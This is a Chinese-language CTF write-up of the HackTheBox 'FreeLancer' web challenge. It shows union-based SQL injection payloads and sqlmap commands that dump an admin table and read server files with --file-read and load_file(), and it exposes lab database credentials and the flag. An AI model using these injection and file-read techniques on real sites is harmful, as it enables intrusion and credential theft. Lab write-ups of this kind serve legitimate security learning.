---
layout: post
title: HTB-Medium-FreeLancer
excerpt: "第七道HTB题目,解题过程"
date:   2021-05-28 09:37:00
categories: [HackTheBox]
comments: true
---

## 解题步骤

1. 题目描述：Can you test how secure my website is? Prove me wrong and capture the flag!

2. 首先访问目标网站，是一个很传统的，三段式页面，Menu实现本页面内跳转

   * PORTFOLIO，显示三个作品的图片
   * ABOUT，介绍了读者会被页面上可读内容分散注意力
   * CONTACT ME，需要填写姓名、邮箱、电话号码、消息四块内容
   * FOOTER，介绍了网站的联系方式：2215 John Daniel Drive Clark, MO 65243

   ![image-20210528094144806](https://monkeydatabase.github.io/img/image-20210528094144806.png)

3. 使用Burp Suite抓包，请求主页

   * 发现第一次请求网页就生成了Cookie：`Cookie: mysession=MTYyMjA4NjA1M3xEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fBUonJQi6UUH2nb090ew93Cyl8hmepKmxtcBg8j_96YC`

   * 查看Burp Suite网站地图，发现它解析出了多个php页面，经检查是从注释和Javascript代码中读取的

     * portfolio.php通过get参数id读取作品，不过网站把它注释掉了

       ```html
       <!-- <a href="portfolio.php?id=3">Portfolio 3</a> --> 
       ```

     * contact_me.php位于contact_me.js代码中

4. 访问`/portfolio.php`

   * 使用id=1访问，发现返回的内容除了一张图，还有一段话："Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam."，这段话虽然没在网页上显示，但是ABOUT部分介绍了这段文字，它是Lorem Ipsum，一段打乱的文字，这段文字因为可以很好的展示字体的大小、间距、粗细等细节而在印刷业流行。因此网页中和Lorem lpsum相关的文字都应该是干扰信息。
   * 使用Burp Suite的Intruder模块对id进行了1-100的遍历，没有发现有效信息。

5. 访问`contact_me.php`

   * 直接通过浏览器发起Get请求

     ```http
     HTTP/1.1 500 Internal Server Error
     Date: Fri, 28 May 2021 02:37:14 GMT
     Server: Apache/2.4.29 (Ubuntu)
     Content-Length: 0
     Connection: close
     Content-Type: text/html; charset=UTF-8
     ```

   * 请求

     ```http
     POST /mail/contact_me.php HTTP/1.1
     Host: [IP]:[PORT]
     Content-Type: application/x-www-form-urlencoded; charset=UTF-8
     X-Requested-With: XMLHttpRequest
     Content-Length: 59
     Cookie: mysession=MTYyMjA4NjA1M3xEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fBUonJQi6UUH2nb090ew93Cyl8hmepKmxtcBg8j_96YC
     
     name=ASF&phone=1&email=1%40qq.com&message=1
     ```

   * 响应

     ```http
     HTTP/1.1 500 Internal Server Error
     Date: Fri, 28 May 2021 02:38:44 GMT
     Server: Apache/2.4.29 (Ubuntu)
     Content-Length: 0
     Connection: close
     Content-Type: text/html; charset=UTF-8
     ```

   * 页面上会显示

     ```tex
     Sorry ASF, it seems that my mail server is not responding. Please try again later!
     ```

   * 页面回显的内容并不是服务器返回的，而是content_me.js解析到返回值为500，将Name拼接进了字符串，给用户进行了展示

6. 对Cookie进行处理，并没有发现有效信息

   `MTYyMjA4NjA1M3xEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fBUonJQi6UUH2nb090ew93Cyl8hmepKmxtcBg8j_96YC`

7. 对网站进行目录遍历

   * 使用dirsearch进行遍历，基本没有什么有效信息，应该是字典不够大
   
   * 之后发现kali自带了一款目录扫描工具`dirb`，它可以使用`/usr/share/wordlists`目录下预装的字典
   
     * 执行命令
   
       ```shell
       dirb "http://[IP]:[PORT]/" -o freelancer.dirb.txt
       ```
   
     * 执行结果
   
       ```shell
       ---- Scanning URL: http://[IP]:[PORT]/ ----
       ==> DIRECTORY: http://[IP]:[PORT]/administrat/
       ==> DIRECTORY: http://[IP]:[PORT]/css/
       ```
   
     * 发现新页面：`http://[IP]:[PORT]/administrat/index.php`
   
8. 访问`/administrat/index.php`，发现是登陆页面

   * 输入任意账号密码，进行抓包

     ```http
     POST /administrat/index.php HTTP/1.1
     Host: [IP]:[PORT]
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Referer: http://[IP]:[PORT]/administrat/index.php
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 28
     Connection: close
     Cookie: PHPSESSID=rucoomi03fmnlora14lcpdene4
     Upgrade-Insecure-Requests: 1
     
     username=123&password=123%27
     ```

   * 返回内容仍是登陆页面，只不过在用户名框下多了一行字，"No account found with that username."

     ![image-20210528151416773](https://monkeydatabase.github.io/img/image-20210528151416773.png)

   * 使用sqlmap对登录接口进行测试，没有扫出诸如点

9. 因为该网站是使用了一个模板，因此我去Github找到了模板源码，然后使用Burp Suite的Comparer模块对比了与本题主页代码的差别，发现差别在几个注释里面，尤其是最后一个注释写道mail/contact_me.php的第19行可以配置邮件地址，因此应该有办法读取网页代码

   ```html
   <!-- <a href="portfolio.php?id=1">Portfolio 1</a> -->
   <!-- <a href="portfolio.php?id=2">Portfolio 2</a> -->
   <!-- <a href="portfolio.php?id=3">Portfolio 3</a> -->
   <!-- To configure the contact form email address, go to mail/contact_me.php and update the email address in the PHP file on line 19. -->
   ```

10. 测试`/portfolio.php?id=`时，发现有代码执行

    * `/portfolio.php?id=2*1.5`，发现返回的结果与`/portfolio.php?id=3`一致

      ![image-20210528170518747](https://monkeydatabase.github.io/img/image-20210528170518747.png)

    * 进一步验证是否是SQL注入，`/portfolio.php?id=1 or 1=1`，由返回值可以确认这是数值类型的SQL注入，且已经是SQL语句的结尾

      ![image-20210528171027545](https://monkeydatabase.github.io/img/image-20210528171027545.png)

    * 尝试获取select语句的参数个数及被返回的值的位置，发现`/portfolio.php?id=1 union select 1,2,3`时，2和3会跟在id=1的记录后返回

    * 获取数据库名和用户名，`/portfolio.php?id=1 union select null,database(),user()`，可以看到当前数据库名为freelancer，用户名为db_user@localhost 

      ![image-20210528172034607](https://monkeydatabase.github.io/img/image-20210528172034607.png)

    * 获取当前数据库的所有表，忽然忘了怎么拼接获取表的语句，使用sqlmap获取表名

      ```shell
      sqlmap -u 'http://[IP]:[PORT]/portfolio.php?id=1' -D freelancer --table
      
      Database: freelancer
      [2 tables]
      +-----------+
      | portfolio |
      | safeadmin |
      +-----------+
      ```

    * 获取safeadmin表的数据，但是密码是加密的

      ```shell
      sqlmap -u 'http://[IP]:[PORT]/portfolio.php?id=1' -D freelancer -T safeadmin --dump
      
      
      +----+----------+--------------------------------------------------------------+--------------------+
      | id | username | password                                                     | created_at         |
      +----+----------+--------------------------------------------------------------+--------------------+
      | 1  | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45|
      +----+----------+--------------------------------------------------------------+--------------------+
      ```

    * 尝试通过sqlmap获取shell失败，应该是无法没有文件写入权限，但是有文件读取权限

    * 根据之前Burp Suite记录的网站地图，试图构造文件路径读取网站的管理员后台登陆源码，查看加密方式

      * shell

        ```shell
        sqlmap -u 'http://[IP]:[PORT]/portfolio.php?id=1' -D freelancer -T safeadmin --file-read=/var/www/html/administrat/index.php
        ```

      * php

        ```php
        <?php
        // Initialize the session
        session_start();
         
        // Check if the user is already logged in, if yes then redirect him to welcome page
        if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
          header("location: panel.php");
          exit;
        }
         
        // Include config file
        require_once "include/config.php";
         
        // Define variables and initialize with empty values
        $username = $password = "";
        $username_err = $password_err = "";
         
        // Processing form data when form is submitted
        if($_SERVER["REQUEST_METHOD"] == "POST"){
         
            // Check if username is empty
            if(empty(trim($_POST["username"]))){
                $username_err = "Please enter username.";
            } else{
                $username = trim($_POST["username"]);
            }
            
            // Check if password is empty
            if(empty(trim($_POST["password"]))){
                $password_err = "Please enter your password.";
            } else{
                $password = trim($_POST["password"]);
            }
            
            // Validate credentials
            if(empty($username_err) && empty($password_err)){
                // Prepare a select statement
                $sql = "SELECT id, username, password FROM safeadmin WHERE username = ?";
                
                if($stmt = mysqli_prepare($link, $sql)){
                    // Bind variables to the prepared statement as parameters
                    mysqli_stmt_bind_param($stmt, "s", $param_username);
                    
                    // Set parameters
                    $param_username = $username;
                    
                    // Attempt to execute the prepared statement
                    if(mysqli_stmt_execute($stmt)){
                        // Store result
                        mysqli_stmt_store_result($stmt);
                        
                        // Check if username exists, if yes then verify password
                        if(mysqli_stmt_num_rows($stmt) == 1){                    
                            // Bind result variables
                            mysqli_stmt_bind_result($stmt, $id, $username, $hashed_password);
                            if(mysqli_stmt_fetch($stmt)){
                                if(password_verify($password, $hashed_password)){
                                    // Password is correct, so start a new session
                                    session_start();
                                    
                                    // Store data in session variables
                                    $_SESSION["loggedin"] = true;
                                    $_SESSION["id"] = $id;
                                    $_SESSION["username"] = $username;                            
                                    
                                    // Redirect user to welcome page
                                    header("location: panel.php");
                                } else{
                                    // Display an error message if password is not valid
                                    $password_err = "The password you entered was not valid.";
                                }
                            }
                        } else{
                            // Display an error message if username doesn't exist
                            $username_err = "No account found with that username.";
                        }
                    } else{
                        echo "Oops! Something went wrong. Please try again later.";
                    }
                }
                
                // Close statement
                mysqli_stmt_close($stmt);
            }
            
            // Close connection
            mysqli_close($link);
        }
        ?>
        ```

      * 可以看到

        * 登录接口访问数据库采用了预编译的代码，因此登录接口不存在SQL注入漏洞
        * 调用了`password_verify()`函数来校验对用户输入的密码，在当前文件并没有实现该函数，但文件一开始`require_once "include/config.php";`，因此可能在该文件中，尝试读取该文件
    
    * 读取`include/config.php`文件
    
      * shell
    
        ```shell
        sqlmap -u 'http://[IP]:[PORT]/portfolio.php?id=1' -D freelancer -T safeadmin --file-read=/var/www/html/administrat/include/config.php
        ```
    
      * php
    
        ```shell
        <?php
        $link = new mysqli("localhost", "db_user", "Str0ngP4ss", "freelancer");
         
        // Check connection
        if($link === false){
            die("ERROR: Could not connect. " . mysqli_connect_error());
        }
        ?>
        ```
    
      * 很可惜，这里面只存了连接数据库的配置信息。
    
    * 通过搜索发现`password_verify()`是PHP原生函数，与`password_hash()`配合使用，逆向hash很麻烦，所以就把safeadm的账号密码改了吧，233333
    
      * 准备新密码为`233333`
    
      * 准备生成密码脚本
    
        ```php
        <?php
        	echo password_hash("233333", PASSWORD_DEFAULT);
        ?>
        ```
    
      * 执行脚本，获取结果
    
        ```tex
        $2y$10$cq7HCnT1oVaDHgNb7BuHR.YRYHRqXlVD4RpzNuWQUK2WXiqaGk8kS
        ```
    
      * 尝试修改密码，失败
      
    * 检查检索作品内容的页面源码，可以看到这里是直接拼接的字符串，所以存在SQL注入漏洞，由于使用了`mysqli_query()`而不是`mysqli_multi_query()`所以无法使用堆叠注入攻击
    
      ```php
      <?php
      // Include config file
      require_once "administrat/include/config.php";
      ?>
      <?php
       
      $id = isset($_GET['id']) ? $_GET['id'] : '';
       
      $query = "SELECT * FROM portfolio WHERE id = $id";
      if ($result = mysqli_query($link, $query)) {
      
          /* fetch associative array */
          while ($row = mysqli_fetch_row($result)) {
              printf ("%s - %s\n", $row[1], $row[2]);
          }
      
          /* free result set */
          mysqli_free_result($result);
      }
      
      /* close connection */
      mysqli_close($link);
      ?>
      
      ```
    
    * 因为之前有个注释提到了要检查`mail/contact_me.php`，因此尝试读取该文件源码，没有有效信息
    
      ```php
      <?php
      // Check for empty fields
      if(empty($_POST['name']) || empty($_POST['email']) || empty($_POST['phone']) || empty($_POST['message']) || !filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
        http_response_code(500);
        exit();
      }
      
      $name = strip_tags(htmlspecialchars($_POST['name']));
      $email = strip_tags(htmlspecialchars($_POST['email']));
      $phone = strip_tags(htmlspecialchars($_POST['phone']));
      $message = strip_tags(htmlspecialchars($_POST['message']));
      
      // Create the email and send the message
      $to = "yourname@yourdomain.com"; // Add your email address inbetween the "" replacing yourname@yourdomain.com - This is where the form will send a message to.
      $subject = "Website Contact Form:  $name";
      $body = "You have received a new message from your website contact form.\n\n"."Here are the details:\n\nName: $name\n\nEmail: $email\n\nPhone: $phone\n\nMessage:\n$message";
      $header = "From: noreply@yourdomain.com\n"; // This is the email address the generated message will be from. We recommend using something like noreply@yourdomain.com.
      $header .= "Reply-To: $email";	
      
      if(!mail($to, $subject, $body, $header))
        http_response_code(500);
      ?>
      ```
    
    * 回想之前登录成功会跳转页面，如果运气好的话，可能在跳转后的页面存在flag，尝试获取`panel.php`源码
    
      * shell
    
        ```shell
        sqlmap -u 'http://[IP]:[PORT]/portfolio.php?id=1' -D freelancer -T safeadmin --file-read=/var/www/html/administrat/panel.php
        ```
    
      * php
    
        ```PHP
        <?php
        // Initialize the session
        session_start();
         
        // Check if the user is logged in, if not then redirect him to login page
        if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
            header("location: index.php");
            exit;
        }
        ?>
         
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Welcome</title>
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
          <link rel="icon" href="../favicon.ico" type="image/x-icon">
            <style type="text/css">
                body{ font: 14px sans-serif; text-align: center; }
            </style>
        </head>
        <body>
            <div class="page-header">
                <h1>Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>. Welcome to our site.</h1><b><a href="logout.php">Logout</a></b>
        <br><br><br>
                <h1>HTB{s4ff_3_1_w33b_fr4__l33nc_3}</h1>
            </div>
        </body>
        </html>
        ```
      
    * 发现flag，HTB{s4ff_3_1_w33b_fr4__l33nc_3}

## 独立思考

### 1、sqlmap是如何准确的下载文件的？

* 手动注入

  * payload

    ```sql
    xian1 union select 1,2,load_file('/var/www/html/administrat/panel.php')
    ```

  * 浏览器效果

    ![image-20210529101832631](https://monkeydatabase.github.io/img/image-20210529101832631.png)

  * Burp Suite效果

    ![image-20210529102453198](https://monkeydatabase.github.io/img/image-20210529102453198.png)

  * 可以看到浏览器会对其中的html代码渲染，而且会自动给php代码加上注释符导致页面上无法显示，常常导致漏洞点被忽视。Burp Suite的话会把PHP文件内容原原本本显示在对应位置，直接截取字符串就可以获取文件内容，但是如何自动获取文件内容将会显示的位置呢？

* sqlmap

  * `/usr/share/sqlmap/data/xml/queries.xml`中配置了针对各种数据库各种功能的sql语句
  * `/usr/share/sqlmap/data/xml/payloads/`目录下针对布尔注入、报错注入、内联注入、堆叠注入、时间盲注、联合注入分别有对应的测试payload文件
  * `/usr/share/sqlmap/lib/contorller/check.py`是检查sql注入漏洞的主要文件
  * sqlmap的代码量比较大，一时间读不完，**之后学习源码之后补充这一部分知识**。

## 产生过的疑问

1. sqlmap是如何准确的下载文件的？

